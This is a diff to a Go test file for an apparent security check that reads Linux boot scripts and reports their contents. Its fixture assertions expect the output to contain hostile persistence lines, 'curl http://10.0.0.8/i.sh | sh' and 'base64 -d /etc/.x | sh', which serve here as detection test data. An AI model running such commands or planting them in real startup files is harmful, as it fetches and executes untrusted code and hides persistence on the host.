@@ -39,55 +39,44 @@ func bootScriptFixture(t *testing.T) []string {
 }
 
 // The tier the boot-script check is built from, run over a fixture: one section
-// per path it was given, the same bytes from the in-process branch and from the
-// script the remote channels run, and nothing for a path that is not there.
-func TestReadFilesTierReadsEveryPathOnBothChannels(t *testing.T) {
+// per path it was given, and nothing for a path that is not there.
+func TestReadFilesTierReadsEveryPath(t *testing.T) {
 	paths := bootScriptFixture(t)
 	steps := readFilesCheck(paths...)
 	if len(steps) != 1 || len(steps[0]) != 1 {
 		t.Fatalf("the read-files tier is one step of one probe: %v", steps)
 	}
-	dual, ok := steps[0][0].Inv.(model.Dual)
+	native, ok := steps[0][0].Inv.(model.Native)
 	if !ok {
-		t.Fatalf("the tier should be a Dual: %+v", steps[0][0].Inv)
+		t.Fatalf("the tier should carry an in-process body: %+v", steps[0][0].Inv)
 	}
-	local, err := dual.Run(context.Background())
+	body, err := native.Body(context.Background())
 	if err != nil {
-		t.Fatalf("the in-process branch: %v", err)
+		t.Fatalf("the tier failed: %v", err)
 	}
-	remote := runPipeline(t, dual.Script)
-	if local != remote {
-		t.Fatalf("the two channels must print the same text:\nlocal  %q\nremote %q", local, remote)
+	for _, want := range []string{
+		"== " + paths[1], "== " + paths[2],
+		"curl http://10.0.0.8/i.sh | sh", "base64 -d /etc/.x | sh",
+	} {
+		if !strings.Contains(body, want) {
+			t.Fatalf("%q is missing from the tier's output: %q", want, body)
+		}
 	}
-	for _, body := range []string{local, remote} {
-		for _, want := range []string{
-			"== " + paths[1], "== " + paths[2],
-			"curl http://10.0.0.8/i.sh | sh", "base64 -d /etc/.x | sh",
-		} {
-			if !strings.Contains(body, want) {
-				t.Fatalf("%q is missing from the tier's output: %q", want, body)
-			}
-		}
-		if strings.Contains(body, paths[0]) {
-			t.Fatalf("a path that does not exist should not appear in the report: %q", body)
-		}
+	if strings.Contains(body, paths[0]) {
+		t.Fatalf("a path that does not exist should not appear in the report: %q", body)
 	}
 }
 
-// The catalog's own list, from the artifact a test can read: the generated script
-// names every path (the in-process branch is a closure over the same list), and
-// the list is the one this test names, because dropping a boot script from it is
-// silent at run time.
+// The boot-script list is the one this test names: the check reads exactly these
+// paths, and dropping one from the list is silent at run time — no fixture and no
+// failing read would notice.
 func TestBootScriptCheckCoversEveryBootScript(t *testing.T) {
 	check := testkit.CheckByID(t, All, "rc-local")
 	if len(check.Steps) != 1 || len(check.Steps[0]) != 1 {
 		t.Fatalf("the boot-script check is one step of one probe: %v", check.Steps)
 	}
-	script := check.Steps[0][0].Inv.(model.Dual).Script
-	for _, path := range bootScriptPaths {
-		if !strings.Contains(script, path) {
-			t.Errorf("the boot-script tier should read %s: %q", path, script)
-		}
+	if _, ok := check.Steps[0][0].Inv.(model.Native); !ok {
+		t.Fatalf("the boot-script tier should carry an in-process body: %+v", check.Steps[0][0].Inv)
 	}
 	want := []string{"/etc/rc.local", "/etc/rc.d/rc.local", "/etc/init.sh"}
 	if !slices.Equal(bootScriptPaths, want) {
